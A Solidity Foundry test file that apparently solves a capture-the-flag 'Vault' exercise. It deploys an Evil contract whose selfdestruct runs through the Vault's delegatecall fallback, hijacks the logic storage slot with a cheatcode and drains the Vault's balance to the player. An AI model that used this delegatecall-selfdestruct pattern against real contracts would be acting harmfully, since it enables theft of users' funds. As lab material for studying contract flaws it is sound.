// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Evil {
    // 注意：这个函数的代码会在 Vault 的上下文通过 delegatecall 执行。
    // 所以 selfdestruct 会销毁 Vault 并把 Vault 的余额发送给 `to`。
    function kill(address payable to) public {
        selfdestruct(to);
    }
}


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        //方法1 ==========================================================================
        // --- hacker code start ---
        // 停止以 palyer 身份调用，改为伪造成原始 owner（address(1)），直接调用 openWithdraw + withdraw
        // vm.stopPrank();
        // vm.startPrank(owner);
        // // 原始 owner 在 setUp 时已经存了 0.1 ETH 在 vault，作为 owner 可以 openWithdraw 并 withdraw
        // vault.openWithdraw();
        // vault.withdraw();

        // vm.stopPrank();
        // --- hacker code end ---
        //方法2 ==========================================================================
        // 1) 部署恶意合约 Evil
        Evil evil = new Evil();
       // 2) 把 Vault.logic (storage slot 1) 改成 evil 的地址
        // Vault 的 storage layout:
        // slot 0: owner
        // slot 1: logic
        // 所以我们写入 slot 1
        bytes32 slot1 = bytes32(uint256(1));
        // 将 evil 地址写入 slot1（注意把 address 转为 uint160 再转 uint256）
        vm.store(address(vault), slot1, bytes32(uint256(uint160(address(evil)))));
        // 3) 通过调用 Vault 并传入对应 calldata（kill(address) 的 selector + 参数）
        //    Vault 的 fallback 会 delegatecall 到 logic（现在是 evil），执行 selfdestruct(to)
        (bool ok, ) = address(vault).call(abi.encodeWithSignature("kill(address)", payable(palyer)));
        require(ok, "call failed");

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
